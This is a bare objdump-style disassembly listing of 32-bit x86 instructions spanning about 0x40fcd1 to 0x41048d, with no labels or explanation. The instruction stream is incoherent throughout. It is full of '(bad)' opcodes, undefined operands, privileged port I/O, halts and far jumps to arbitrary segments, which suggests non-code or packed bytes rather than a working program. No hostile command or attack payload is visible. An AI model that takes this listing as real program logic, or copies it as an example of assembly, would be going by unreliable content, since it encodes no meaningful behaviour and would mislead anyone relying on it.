  40fcd1:	repz gs push ds
  40fcd4:	jg     0x40fcb8
  40fcd6:	vpaddusb xmm3,xmm0,XMMWORD PTR [edi]
  40fcda:	es mov edi,0x274bfc1a
  40fce0:	sub    BYTE PTR [ebp+edx*4+0x1fc146c7],al
  40fce7:	inc    edx
  40fce8:	xchg   ecx,eax
  40fce9:	call   0x37c4:0x34282186
  40fcf0:	mov    ch,0x84
  40fcf2:	daa    
  40fcf3:	cmc    
  40fcf4:	idiv   DWORD PTR [eax]
  40fcf6:	push   eax
  40fcf7:	push   ss
  40fcf8:	dec    eax
  40fcf9:	push   edx
  40fcfa:	xchg   ebx,eax
  40fcfb:	cmp    esp,DWORD PTR ds:0x3c3f6dde
  40fd01:	or     edx,edi
  40fd03:	les    ebx,FWORD PTR [eax-0xc]
  40fd06:	repz push cs
  40fd08:	aad    0x67
  40fd0a:	or     al,0xf6
  40fd0c:	cmp    al,0xdd
  40fd0e:	mov    esp,0x2e82bd0b
  40fd13:	je     0x40fd43
  40fd15:	pop    ebp
  40fd16:	mov    ch,0x6c
  40fd18:	movq   QWORD PTR [edi],mm1
  40fd1b:	sub    bh,0x22
  40fd1e:	stos   BYTE PTR es:[edi],al
  40fd1f:	pop    esp
  40fd20:	push   eax
  40fd21:	shr    BYTE PTR [ecx],0x6b
  40fd24:	in     eax,0xc0
  40fd26:	xor    eax,0x79162dff
  40fd2b:	cdq    
  40fd2c:	pusha  
  40fd2d:	and    edx,DWORD PTR [ebp+0x241ade73]
  40fd33:	lods   eax,DWORD PTR ds:[esi]
  40fd34:	int    0xb0
  40fd36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd37:	cli    
  40fd38:	hlt    
  40fd39:	out    dx,al
  40fd3a:	addr16 popf 
  40fd3c:	and    ah,BYTE PTR ss:[edx+0x181e3253]
  40fd43:	inc    esi
  40fd44:	and    ecx,DWORD PTR [eax-0x69]
  40fd47:	inc    edi
  40fd48:	fs cli 
  40fd4a:	imul   bl
  40fd4c:	add    BYTE PTR [edx+0x47e9a551],ch
  40fd52:	stos   BYTE PTR es:[edi],al
  40fd53:	loop   0x40fd61
  40fd55:	jecxz  0x40fd83
  40fd57:	jge    0x40fd6e
  40fd59:	clc    
  40fd5a:	out    0xff,al
  40fd5c:	icebp  
  40fd5d:	loopne 0x40fd86
  40fd5f:	std    
  40fd60:	fwait
  40fd61:	mov    bh,0xf1
  40fd63:	dec    edi
  40fd64:	cdq    
  40fd65:	lea    esi,[ecx-0x40]
  40fd68:	pusha  
  40fd69:	mov    eax,0x735ae47
  40fd6e:	daa    
  40fd6f:	or     BYTE PTR [esi],dl
  40fd71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fd72:	or     ebp,ebp
  40fd74:	test   DWORD PTR [edx],ebx
  40fd76:	and    al,0x69
  40fd78:	mov    eax,0x174f0db3
  40fd7d:	pop    esp
  40fd7e:	inc    esi
  40fd7f:	in     al,dx
  40fd80:	iret   
  40fd81:	jl     0x40fd60
  40fd83:	mov    al,0x9f
  40fd85:	xchg   ebp,eax
  40fd86:	rcl    BYTE PTR [ebp-0x369c18c6],1
  40fd8c:	sbb    ebx,edx
  40fd8e:	or     eax,0x6a2a6196
  40fd93:	imul   eax,DWORD PTR [eax+0x54],0x7efdfab9
  40fd9a:	test   eax,0xefdd87b6
  40fd9f:	push   ecx
  40fda0:	outs   dx,WORD PTR ds:[esi]
  40fda2:	fbstp  TBYTE PTR [ecx+0xf260024]
  40fda8:	(bad)  
  40fda9:	pop    esi
  40fdaa:	cmp    ch,BYTE PTR [ebp-0x74]
  40fdad:	adc    BYTE PTR [edi],cl
  40fdaf:	cmp    al,0x7e
  40fdb1:	cwde   
  40fdb2:	xchg   esi,eax
  40fdb3:	nop
  40fdb4:	mov    ds:0xa4dc1416,eax
  40fdb9:	push   es
  40fdba:	sti    
  40fdbb:	and    DWORD PTR [edx+esi*2],ebx
  40fdbe:	arpl   WORD PTR [edi+0x74ddb2a7],ax
  40fdc4:	and    DWORD PTR [ebx],edi
  40fdc6:	add    edi,0x43254b84
  40fdcc:	sub    eax,DWORD PTR [edx+0x226c5a11]
  40fdd2:	in     eax,0xea
  40fdd4:	dec    esp
  40fdd5:	mov    ch,0xb1
  40fdd7:	xor    al,0x74
  40fdd9:	sub    eax,0x3ffba1fb
  40fdde:	and    eax,0xa915e81c
  40fde3:	ret    0x5494
  40fde6:	mov    dh,0xe4
  40fde8:	sub    esp,DWORD PTR [edi-0xb]
  40fdeb:	cmp    bh,BYTE PTR [eax+0x5c]
  40fdee:	add    al,0xa8
  40fdf0:	or     edx,ebx
  40fdf2:	push   cs
  40fdf3:	push   edi
  40fdf4:	add    bx,cx
  40fdf7:	enter  0x8fa1,0xf9
  40fdfb:	shr    DWORD PTR [eax],cl
  40fdfd:	int3   
  40fdfe:	call   0x71c54b73
  40fe03:	and    BYTE PTR [ebx+0x50],bh
  40fe06:	ror    DWORD PTR [eax],0x6a
  40fe09:	mov    BYTE PTR [edx],bl
  40fe0b:	enter  0xe424,0x71
  40fe0f:	fldenv [edx+ebx*8]
  40fe12:	or     al,0x74
  40fe14:	imul   esi,DWORD PTR [ebp-0x10],0xb57c536
  40fe1b:	pop    es
  40fe1c:	xchg   eax,eax
  40fe1e:	ins    DWORD PTR es:[edi],dx
  40fe1f:	xor    ecx,eax
  40fe21:	cld    
  40fe22:	cmp    bl,BYTE PTR [eax+0x55172b1d]
  40fe28:	jmp    0x6f98:0xac57181b
  40fe2f:	or     esp,DWORD PTR [edx]
  40fe31:	mov    cl,cl
  40fe33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe34:	sbb    esi,ecx
  40fe36:	sti    
  40fe37:	iret   
  40fe38:	aad    0x81
  40fe3a:	mov    cl,0xdd
  40fe3c:	pop    ss
  40fe3d:	cmp    al,0x5a
  40fe3f:	sbb    dl,BYTE PTR [esi-0x7118e50]
  40fe45:	aas    
  40fe46:	inc    esi
  40fe47:	dec    ebp
  40fe48:	mov    dh,0x71
  40fe4a:	out    0x31,eax
  40fe4c:	or     al,0x30
  40fe4e:	fucomip st,st(1)
  40fe50:	adc    dh,BYTE PTR [esi-0x266a4ba1]
  40fe56:	xchg   esi,eax
  40fe57:	cmc    
  40fe58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe59:	add    al,al
  40fe5b:	dec    esi
  40fe5c:	mov    al,0x5a
  40fe5e:	add    DWORD PTR [ebx+esi*8+0x2e81bc33],edx
  40fe65:	fisub  DWORD PTR [edx-0x47]
  40fe68:	inc    edx
  40fe69:	push   ecx
  40fe6a:	sbb    DWORD PTR [edi],ebp
  40fe6c:	xchg   edx,eax
  40fe6d:	push   edx
  40fe6e:	mov    al,ds:0xb562dea8
  40fe73:	adc    al,0xf0
  40fe75:	jbe    0x40fe7e
  40fe77:	mov    esi,0xd20560d2
  40fe7c:	inc    edx
  40fe7d:	sub    al,0x95
  40fe7f:	pop    esp
  40fe80:	xchg   DWORD PTR [ebx],esi
  40fe82:	adc    al,dl
  40fe84:	sbb    ah,cl
  40fe86:	inc    edi
  40fe87:	icebp  
  40fe88:	or     BYTE PTR [ebx+eax*1],ah
  40fe8b:	call   0x3b61:0xe26dc8b7
  40fe92:	sbb    ebx,esp
  40fe94:	outs   dx,DWORD PTR ds:[esi]
  40fe95:	jmp    0xb3f12efe
  40fe9a:	sub    edx,DWORD PTR [ebp+0x7dc405b5]
  40fea0:	dec    esi
  40fea1:	xor    eax,0x639d8d15
  40fea6:	(bad)  
  40fea7:	js     0x40ff09
  40fea9:	xor    al,0x2
  40feab:	push   esp
  40feac:	push   0xbe73d839
  40feb1:	pop    ds
  40feb2:	pusha  
  40feb3:	mov    bl,0xf9
  40feb5:	add    dl,bl
  40feb7:	or     DWORD PTR [edx],ebp
  40feb9:	mov    BYTE PTR [ebp+0x71],bl
  40febc:	mov    esp,0x162b9152
  40fec1:	pop    edi
  40fec2:	cmp    esp,DWORD PTR [ebx-0x6b]
  40fec5:	(bad)  
  40fec6:	cmp    DWORD PTR [eax+0xc],esi
  40fec9:	dec    edx
  40feca:	mov    ecx,0xa2474b81
  40fecf:	or     eax,0x2ea5c9d5
  40fed4:	push   esp
  40fed5:	add    eax,0x7ea3b974
  40feda:	out    0x12,eax
  40fedc:	xor    eax,0x703cce49
  40fee1:	xor    ebx,eax
  40fee3:	mov    bl,0x2
  40fee5:	aam    0xd2
  40fee7:	mov    bl,0x28
  40fee9:	gs mov ah,0x98
  40feec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40feed:	mov    ebp,0xeab6470f
  40fef2:	(bad)  
  40fef3:	jge    0x40fee2
  40fef5:	mov    ebx,0xaa969aa1
  40fefa:	imul   edx,DWORD PTR [edi+0x40],0xffffffa0
  40fefe:	sbb    al,0xf4
  40ff00:	lea    edi,[edx+0x46]
  40ff03:	iret   
  40ff04:	lock mov ch,0x2b
  40ff07:	adc    edi,esp
  40ff09:	in     eax,dx
  40ff0a:	dec    esp
  40ff0b:	ret    
  40ff0c:	test   ebx,eax
  40ff0e:	mov    eax,0x1dda84ae
  40ff13:	or     eax,0x8fe5cb79
  40ff18:	dec    ebp
  40ff19:	jne    0x40ff8d
  40ff1b:	xchg   BYTE PTR [eax+0x68],ch
  40ff1e:	add    DWORD PTR [esp+ebx*2-0x763a184a],esp
  40ff25:	mov    esp,0x582d12d7
  40ff2a:	jmp    0x40fefa
  40ff2c:	(bad)  ss:[ebp-0x5d2a1c72]
  40ff33:	jno    0x40ffac
  40ff35:	repz (bad) 
  40ff38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff39:	xchg   edx,eax
  40ff3a:	idiv   DWORD PTR [ebx-0x7d98fc96]
  40ff40:	sub    al,0xcc
  40ff42:	sub    DWORD PTR [ecx],ebx
  40ff44:	out    0x2b,eax
  40ff46:	aas    
  40ff47:	dec    ecx
  40ff48:	mov    WORD PTR [edi+0x5d],?
  40ff4b:	imul   BYTE PTR [ebx-0x6b002a8d]
  40ff51:	repnz push 0x4c
  40ff54:	jmp    0x2a0fe278
  40ff59:	rcl    BYTE PTR [ebp-0x3b],cl
  40ff5c:	clc    
  40ff5d:	ror    DWORD PTR ds:[ecx],1
  40ff60:	sub    eax,ebx
  40ff62:	inc    ecx
  40ff63:	int3   
  40ff64:	lods   eax,DWORD PTR ds:[esi]
  40ff65:	das    
  40ff66:	cs in  al,dx
  40ff68:	ror    DWORD PTR [edx-0x461ebd8b],0x6c
  40ff6f:	add    DWORD PTR [edx+0x2bf1528c],ebx
  40ff75:	mov    ebp,ebp
  40ff77:	lods   al,BYTE PTR ds:[esi]
  40ff78:	dec    esi
  40ff79:	leave  
  40ff7a:	out    0x71,eax
  40ff7c:	jecxz  0x40ffb1
  40ff7e:	sbb    BYTE PTR [eax],dh
  40ff80:	mov    fs,WORD PTR [ebp-0x3b]
  40ff83:	(bad)  
  40ff84:	cmc    
  40ff85:	adc    al,0x77
  40ff88:	add    dl,BYTE PTR [esi]
  40ff8a:	neg    dl
  40ff8c:	push   ebx
  40ff8d:	fidivr WORD PTR [ecx]
  40ff8f:	call   0xf726:0x1ab2ab51
  40ff96:	lea    edx,[esi]
  40ff98:	lods   eax,DWORD PTR ds:[esi]
  40ff99:	xchg   ebp,eax
  40ff9a:	pop    esi
  40ff9b:	jnp    0x40ff25
  40ff9d:	retf   
  40ff9e:	stos   DWORD PTR es:[edi],eax
  40ff9f:	int3   
  40ffa0:	test   al,0x7d
  40ffa2:	shl    BYTE PTR [edi-0x22],1
  40ffa5:	xchg   BYTE PTR [esi+0x63],cl
  40ffa8:	fsubr  QWORD PTR [edi]
  40ffaa:	sbb    edx,ecx
  40ffac:	in     al,dx
  40ffad:	add    bh,BYTE PTR [eax-0x1b]
  40ffb0:	mov    DWORD PTR [esp+edi*1-0x23a1a217],ebx
  40ffb7:	mov    ebp,0xf1c508ec
  40ffbc:	inc    edx
  40ffbd:	mov    bl,0x4f
  40ffbf:	or     BYTE PTR [ecx+ebx*2],al
  40ffc2:	shl    DWORD PTR [ecx-0x6c],0xaa
  40ffc6:	mov    ah,0xa
  40ffc8:	stos   DWORD PTR es:[edi],eax
  40ffc9:	xor    DWORD PTR [ebx+0x72],edi
  40ffcc:	out    dx,eax
  40ffcd:	push   cs
  40ffce:	mov    edi,0xb645c8fe
  40ffd3:	sbb    DWORD PTR [esi+ebx*8+0x66],0x18
  40ffd8:	or     DWORD PTR [ecx-0x54],ebx
  40ffdb:	int    0xc8
  40ffdd:	(bad)  
  40ffde:	je     0x40ffd1
  40ffe0:	stos   BYTE PTR es:[edi],al
  40ffe1:	pop    ecx
  40ffe2:	push   ecx
  40ffe3:	sub    BYTE PTR [edx+0x15],dh
  40ffe6:	loop   0x40ff81
  40ffe8:	bound  ecx,QWORD PTR [eax+0x277b6e06]
  40ffee:	test   BYTE PTR [esp+eax*1-0x1bb94d2f],0xa0
  40fff6:	call   0xf6a49007
  40fffb:	aaa    
  40fffc:	jecxz  0x410034
  40fffe:	ss (bad) 
  410000:	aas    
  410001:	ds in  eax,dx
  410003:	sahf   
  410004:	ret    0xd972
  410007:	sub    eax,0xcf3c8686
  41000c:	xchg   ebp,eax
  41000d:	js     0x410018
  41000f:	cmp    BYTE PTR [esi],ch
  410011:	or     al,0x1
  410013:	xchg   DWORD PTR [ebp+0x63],ecx
  410016:	enter  0x202d,0xe0
  41001a:	imul   edi,DWORD PTR [eax+0x2028c2d3],0xffffff96
  410021:	cdq    
  410022:	xchg   ah,ah
  410024:	lock jns 0x410097
  410027:	je     0x410019
  410029:	xor    al,0xdd
  41002c:	ret    
  41002d:	adc    al,BYTE PTR [ebx-0x3f]
  410030:	or     al,bl
  410032:	xchg   ebx,eax
  410033:	pop    ds
  410034:	mov    eax,0x4aab9220
  410039:	or     al,0x73
  41003b:	push   eax
  41003c:	loope  0x410037
  41003e:	adc    eax,0xe45f3fc8
  410043:	sub    al,0x34
  410045:	ret    0x2e46
  410048:	ds and esp,edi
  41004b:	out    0x46,eax
  41004d:	mov    ds:0xc0ffa4d,eax
  410052:	test   bl,bh
  410054:	or     esi,DWORD PTR ds:[edi]
  410057:	int    0x4a
  410059:	or     al,BYTE PTR [eax+eiz*4+0x97c996f]
  410060:	mov    esi,0x17420bf9
  410065:	test   BYTE PTR [eax+0x4e],dl
  410068:	bound  ecx,QWORD PTR [esi]
  41006a:	add    esi,ebp
  41006c:	loop   0x40ffef
  41006e:	lahf   
  41006f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410070:	push   esp
  410071:	(bad)
  410074:	adc    eax,0x2593bf69
  410079:	xchg   edi,eax
  41007a:	jno    0x41006c
  41007c:	add    ah,ch
  41007e:	xor    BYTE PTR [ecx+0x478ebae5],0xf4
  410085:	mov    bh,0xc6
  410087:	xor    DWORD PTR [edi+0x23],eax
  41008a:	cmp    esi,esi
  41008c:	add    al,0x8f
  41008e:	and    edi,DWORD PTR es:[ecx+0x46]
  410092:	sub    cl,BYTE PTR [edi]
  410094:	sub    ch,BYTE PTR [esi+ebp*2]
  410097:	and    ebx,esp
  410099:	sbb    eax,0x9829df97
  41009e:	push   edi
  41009f:	daa    
  4100a0:	or     DWORD PTR [edi-0x49],esi
  4100a3:	jbe    0x410060
  4100a5:	xor    BYTE PTR [eax-0x2e],dl
  4100a8:	mov    cl,0x6a
  4100aa:	xchg   ebp,eax
  4100ab:	jae    0x4100ff
  4100ad:	lods   eax,DWORD PTR ds:[esi]
  4100ae:	sub    ecx,DWORD PTR [eax-0xde008f0]
  4100b4:	pop    ebx
  4100b5:	addr16 mov ecx,0xd2d9406f
  4100bb:	lods   eax,DWORD PTR ds:[esi]
  4100bc:	inc    edi
  4100bd:	push   eax
  4100be:	daa    
  4100bf:	mov    esp,0xde5b8bae
  4100c4:	adc    ebx,DWORD PTR [esp-0x7d7e1318]
  4100cb:	sbb    al,0xf3
  4100cd:	cmp    edi,eax
  4100cf:	mov    esi,0xe9c34ce6
  4100d4:	outs   dx,DWORD PTR ds:[esi]
  4100d5:	pusha  
  4100d6:	(bad)  
  4100d7:	(bad)  
  4100d8:	(bad)  
  4100da:	xchg   BYTE PTR [ecx-0x4f],bl
  4100dd:	loop   0x410093
  4100df:	das    
  4100e0:	das    
  4100e1:	mov    edi,0x336de680
  4100e6:	sbb    al,0x59
  4100e8:	mov    dh,0xfe
  4100ea:	mov    ch,0xfb
  4100ec:	icebp  
  4100ed:	sub    esp,DWORD PTR [eax+esi*4-0x69]
  4100f1:	pop    ds
  4100f2:	xor    al,0xc4
  4100f4:	jmp    0xcbd7:0xa942371d
  4100fb:	ret    0x9533
  4100fe:	imul   esi,edi,0x640d4787
  410104:	pop    edx
  410105:	adc    ecx,DWORD PTR [edi+0x5267c287]
  41010b:	jno    0x410158
  41010d:	cmc    
  41010e:	stos   DWORD PTR es:[edi],eax
  41010f:	inc    ebp
  410110:	dec    ebx
  410111:	jno    0x41014c
  410113:	loope  0x41018d
  410115:	xor    esi,DWORD PTR [ecx-0x63]
  410118:	xor    DWORD PTR [eax+0x38a9c2a2],0x3c5c7334
  410122:	sti    
  410123:	cmp    eax,0xba25eaf1
  410128:	jae    0x410119
  41012a:	js     0x4101a5
  41012c:	mov    dl,0x63
  41012e:	or     cl,BYTE PTR ds:0x744ba358
  410134:	ss aas 
  410136:	xor    edx,edi
  410138:	pop    esi
  410139:	pop    esi
  41013a:	or     eax,0xb56baf75
  41013f:	jle    0x410105
  410141:	jbe    0x41013c
  410143:	lods   eax,DWORD PTR ds:[esi]
  410144:	push   0x1b
  410146:	xchg   ebx,eax
  410147:	inc    ebx
  410148:	(bad)  
  410149:	pusha  
  41014a:	int    0x13
  41014c:	jbe    0x410165
  41014e:	inc    ebp
  41014f:	jmp    0x4101c0
  410151:	adc    al,0x15
  410153:	adc    DWORD PTR [bp+di-0x10c8],ebx
  410158:	jl     0x4100f9
  41015a:	std    
  41015b:	int3   
  41015c:	(bad)  
  41015e:	es cld 
  410160:	fldcw  WORD PTR [ebx+0x59]
  410163:	loopne 0x410108
  410165:	fistp  DWORD PTR [esp+esi*1+0x53823f46]
  41016c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41016d:	cmc    
  41016e:	sbb    BYTE PTR [esi+0x73],cl
  410171:	mov    esi,0x8cbdda51
  410176:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410177:	shl    DWORD PTR [ebx-0xb841cb],cl
  41017d:	push   edi
  41017e:	adc    al,BYTE PTR [ebp+0x6b67de6a]
  410184:	xchg   BYTE PTR [edi],dh
  410186:	or     eax,0x84742b3e
  41018b:	jne    0x41013b
  41018d:	xor    BYTE PTR [esi+0x17b4fdd0],al
  410193:	push   ds
  410194:	dec    esp
  410195:	sahf   
  410196:	mov    bh,0xec
  410198:	push   ecx
  410199:	jmp    0x410183
  41019b:	sbb    edx,esi
  41019d:	push   cs
  41019e:	pop    ecx
  41019f:	imul   ebx
  4101a1:	mov    edx,0x62d41ac8
  4101a6:	add    al,0x33
  4101a8:	and    ebx,DWORD PTR [ebx+0x34]
  4101ab:	adc    ah,ch
  4101ad:	hlt    
  4101ae:	mov    edx,0x9d995a60
  4101b3:	fstp   TBYTE PTR [edi+0x12]
  4101b6:	mov    edx,0x88a500b9
  4101bb:	shl    DWORD PTR [ecx-0x59],0x9d
  4101bf:	dec    ecx
  4101c0:	xchg   bh,dh
  4101c2:	sbb    al,0xe3
  4101c4:	sti    
  4101c5:	aas    
  4101c6:	and    BYTE PTR [ebx+0xdd9d7e1],al
  4101cc:	xchg   esi,eax
  4101cd:	jle    0x4101f0
  4101cf:	std    
  4101d0:	(bad)  
  4101d1:	loope  0x410235
  4101d3:	clc    
  4101d4:	ins    BYTE PTR es:[edi],dx
  4101d5:	dec    edx
  4101d6:	cmp    eax,ebp
  4101d8:	push   edi
  4101d9:	xor    eax,edx
  4101db:	add    BYTE PTR [edx],dh
  4101dd:	loop   0x410244
  4101df:	jg     0x4101fd
  4101e1:	mov    ecx,ebx
  4101e3:	xor    DWORD PTR [ebp+0x21],0xbc23b648
  4101ea:	repz jecxz 0x4101f3
  4101ed:	add    eax,0x3aa2021b
  4101f2:	call   0xc8c05770
  4101f7:	aam    0x74
  4101f9:	shl    DWORD PTR [edx+ecx*1-0x2793fdf6],0x7c
  410201:	loop   0x410266
  410203:	jge    0x41024a
  410205:	out    0x20,eax
  410207:	fimul  WORD PTR [ebx]
  410209:	mov    cl,BYTE PTR [ebx+0x3]
  41020c:	ret    
  41020d:	mov    dl,dl
  41020f:	enter  0x6c00,0x8a
  410213:	scas   al,BYTE PTR es:[edi]
  410214:	ins    BYTE PTR es:[edi],dx
  410215:	aaa    
  410216:	xchg   esi,eax
  410217:	sub    DWORD PTR [ecx+ebx*4-0x3cfec0f5],edi
  41021e:	mov    edx,0xc2cf4672
  410223:	and    al,0xf7
  410225:	les    ecx,FWORD PTR [ebx+0x2b0f4b4f]
  41022b:	cmp    ah,al
  41022d:	adc    eax,esp
  41022f:	xor    al,0xe9
  410231:	fwait
  410232:	popa   
  410233:	repnz ss add eax,0x2a5b50f0
  41023a:	add    esi,DWORD PTR [ebp+0x30]
  41023d:	(bad)  
  41023e:	push   ss
  41023f:	imul   ecx,DWORD PTR [ebx-0x776d7869],0xe7180a28
  410249:	rol    DWORD PTR [eax],0x97
  41024c:	iret   
  41024d:	pop    es
  41024e:	(bad)  
  410250:	leave  
  410251:	outs   dx,DWORD PTR ds:[esi]
  410252:	(bad)  
  410253:	gs inc ebp
  410255:	out    0xf2,eax
  410257:	cmc    
  410258:	inc    esi
  410259:	xchg   BYTE PTR [ebx-0x35],al
  41025c:	adc    bl,cl
  41025e:	repnz push ds
  410260:	xor    BYTE PTR [ebp-0x7a],0xa1
  410264:	sub    al,0xaf
  410266:	int    0x5
  410268:	data16 (bad) 
  41026a:	push   edx
  41026b:	and    BYTE PTR [edx-0x5e89f47e],dh
  410271:	or     eax,0x8d7a61cc
  410276:	push   ecx
  410277:	daa    
  410278:	outs   dx,BYTE PTR ds:[esi]
  410279:	out    0xf7,al
  41027b:	push   esi
  41027c:	push   edx
  41027d:	mov    esp,0xbebaf85a
  410282:	xor    DWORD PTR [ecx-0x518ef065],ebp
  410288:	call   0x484:0xe6edbb61
  41028f:	scas   eax,DWORD PTR es:[edi]
  410290:	(bad)  
  410292:	adc    ebp,esi
  410294:	shl    dh,0xfa
  410297:	push   ebx
  410298:	scas   al,BYTE PTR es:[edi]
  410299:	(bad)  
  41029a:	jne    0x410250
  41029c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41029d:	fisub  DWORD PTR [edi]
  41029f:	or     BYTE PTR [esi+0xda0905a],al
  4102a5:	inc    edx
  4102a6:	or     eax,0x402888d7
  4102ab:	gs aad 0xc4
  4102ae:	inc    esi
  4102af:	mov    WORD PTR [edx+0x3c4319f5],?
  4102b5:	imul   ecx,ecx,0x4b9258f1
  4102bb:	scas   eax,DWORD PTR es:[edi]
  4102bc:	scas   eax,DWORD PTR es:[edi]
  4102bd:	inc    esi
  4102be:	xor    ebp,DWORD PTR [ebx]
  4102c0:	sbb    bh,dh
  4102c2:	ja     0x410259
  4102c4:	mov    cl,0x57
  4102c6:	sub    dh,al
  4102c8:	cmp    BYTE PTR [ebp-0x6ebc7356],cl
  4102ce:	push   cs
  4102cf:	stos   BYTE PTR es:[edi],al
  4102d0:	fld    DWORD PTR [eax-0x6e]
  4102d3:	popa   
  4102d4:	xor    DWORD PTR [esi+0x2e],esp
  4102d7:	mov    dh,0x84
  4102d9:	enter  0xe48c,0xf8
  4102dd:	adc    al,0x14
  4102df:	push   ebx
  4102e0:	dec    DWORD PTR [edi-0x34]
  4102e3:	ds push 0xffffffa8
  4102e6:	cmp    al,0xa0
  4102e8:	pushf  
  4102e9:	das    
  4102ea:	cld    
  4102eb:	sub    al,bh
  4102ed:	push   ebp
  4102ee:	sub    al,0xc5
  4102f0:	loope  0x410361
  4102f2:	rcr    DWORD PTR [eax-0x816eb32],cl
  4102f8:	in     al,dx
  4102f9:	mov    ecx,DWORD PTR [ebx+0x26f20536]
  4102ff:	neg    BYTE PTR [esi]
  410301:	sti    
  410302:	xor    eax,DWORD PTR ds:0x32a2fe37
  410308:	xor    eax,0x6ff6312a
  41030d:	(bad)  
  41030e:	call   0x12b4d4b0
  410313:	aaa    
  410314:	gs pop ss
  410316:	cdq    
  410317:	mov    edi,0x2d254509
  41031c:	xor    bh,bl
  41031e:	inc    ecx
  41031f:	sub    edx,ecx
  410321:	push   0x3ea3924
  410326:	pop    edi
  410327:	fcomp  QWORD PTR [esi+0x35]
  41032a:	dec    esi
  41032b:	mov    ss,WORD PTR [ebx+0xec43e58]
  410331:	fsubr  st,st(1)
  410333:	dec    edi
  410334:	pusha  
  410335:	(bad)  
  410336:	adc    esi,DWORD PTR [esi+0x6e]
  410339:	imul   edi,DWORD PTR [eax],0x369edbbb
  41033f:	pop    esp
  410340:	out    0x9f,eax
  410342:	xor    BYTE PTR [ecx-0x3d],0x27
  410346:	mov    bh,0xc5
  410348:	pop    esi
  410349:	rcr    DWORD PTR [ebx+ebx*8-0x4f9cf413],1
  410350:	(bad)  
  410352:	call   0xb457:0xb1970df5
  410359:	fwait
  41035a:	aaa    
  41035b:	call   0x58504e76
  410360:	sub    ebp,DWORD PTR [esi+esi*2-0x29]
  410364:	arpl   WORD PTR [ebp*4+0x78bfe543],sp
  41036b:	gs pop esp
  41036d:	les    edx,FWORD PTR [edi]
  41036f:	aaa    
  410370:	stc    
  410371:	sbb    BYTE PTR [ebx+ecx*4],0x1d
  410375:	mov    BYTE PTR [eax+eiz*2-0x6ad1b1c7],bh
  41037c:	ins    DWORD PTR es:[edi],dx
  41037d:	mov    DWORD PTR [eax-0x7b],esi
  410380:	loopne 0x4103e3
  410382:	sbb    DWORD PTR [ebx-0x77],0x5f
  410386:	clc    
  410387:	dec    ebx
  410388:	ins    BYTE PTR es:[edi],dx
  410389:	jne    0x41032d
  41038b:	test   bl,bl
  41038d:	xor    DWORD PTR [ebx],ecx
  41038f:	or     al,0xbb
  410391:	pop    ebp
  410392:	rcr    BYTE PTR [ebp-0x35],cl
  410395:	frstpm(287 only) 
  410397:	pop    eax
  410398:	mov    edx,0xd1b8ebc0
  41039d:	ret    0xf2c4
  4103a0:	mov    BYTE PTR [eax+ebx*4],dl
  4103a3:	mov    al,ds:0x1ec3912d
  4103a8:	scas   al,BYTE PTR es:[edi]
  4103a9:	push   edi
  4103aa:	stos   BYTE PTR es:[edi],al
  4103ab:	inc    esp
  4103ac:	call   0x9e0f:0xf2820fff
  4103b3:	fwait
  4103b4:	and    eax,0xd7ac53c1
  4103b9:	shl    DWORD PTR [ecx],cl
  4103bb:	mov    al,ds:0xcdfcb315
  4103c0:	sbb    eax,0x26314ee6
  4103c5:	das    
  4103c6:	retf   0x779e
  4103c9:	adc    ebp,DWORD PTR [ebx]
  4103cb:	pop    edx
  4103cc:	hlt    
  4103cd:	retf   
  4103ce:	jae    0x41036d
  4103d0:	aas    
  4103d1:	je     0x4103f2
  4103d3:	and    dh,BYTE PTR [ecx]
  4103d5:	fs mov eax,0x2d613980
  4103db:	stos   BYTE PTR es:[edi],al
  4103dc:	mov    ecx,ds
  4103de:	aaa    
  4103df:	mov    al,0x56
  4103e1:	xchg   DWORD PTR [esi+0x35],ecx
  4103e4:	push   0xffffff9f
  4103e6:	or     DWORD PTR [edi-0x5f],edi
  4103e9:	and    bh,al
  4103eb:	bound  eax,QWORD PTR [ecx+eiz*2+0x33]
  4103ef:	fstp   QWORD PTR ds:[edx-0x71ac4d59]
  4103f6:	ror    DWORD PTR [esi],1
  4103f8:	xchg   BYTE PTR ds:0xa2757fa,bh
  4103fe:	ds pop ecx
  410400:	inc    esi
  410401:	xor    al,0x81
  410403:	jns    0x410477
  410405:	call   0xed18c93b
  41040a:	std    
  41040b:	ins    DWORD PTR es:[edi],dx
  41040c:	mov    ds:0xd6af1f54,al
  410411:	ins    BYTE PTR es:[edi],dx
  410412:	mov    al,ds:0x9129ab87
  410417:	push   ds
  410418:	sbb    BYTE PTR [ebp+ebp*4+0x7d],bl
  41041c:	arpl   di,si
  41041e:	mov    ebx,0xae2f9337
  410423:	mov    al,ds:0xdf9495c1
  410428:	mov    ecx,0xb6657a1
  41042d:	aad    0xc6
  41042f:	data16 or BYTE PTR [ecx-0x44584156],cl
  410436:	jne    0x41041e
  410438:	dec    ebx
  410439:	xchg   ebp,eax
  41043a:	cmp    DWORD PTR [edx],ebp
  41043c:	aam    0xe3
  41043e:	nop
  41043f:	mov    ah,BYTE PTR [edi]
  410441:	mov    eax,0x780fd860
  410446:	jae    0x410493
  410448:	inc    edi
  410449:	das    
  41044a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41044b:	test   al,0xab
  41044d:	fs push edi
  41044f:	mov    edx,0x9da8483
  410454:	es mov bl,0xaf
  410457:	mov    edx,0x201b7ea4
  41045c:	lods   al,BYTE PTR ds:[esi]
  41045d:	mov    eax,0x4dfdca5f
  410462:	jno    0x4104d3
  410464:	adc    dh,cl
  410466:	pop    esi
  410467:	inc    ecx
  410468:	out    0x74,eax
  41046a:	push   cs
  41046b:	adc    al,0xe8
  41046d:	cmp    esi,DWORD PTR [eax]
  41046f:	mov    WORD PTR [eax+0x57],ds
  410472:	mov    eax,ds:0x8ffaf5b4
  410477:	sbb    ebp,DWORD PTR ds:0x5e6bfebb
  41047d:	adc    DWORD PTR [esi-0x5af1f7cf],eax
  410483:	mov    edi,0x23c2f65
  410488:	out    0x6,al
  41048a:	ds mov ch,0x99
  41048d:	lds    ebx,FWORD PTR [ecx]
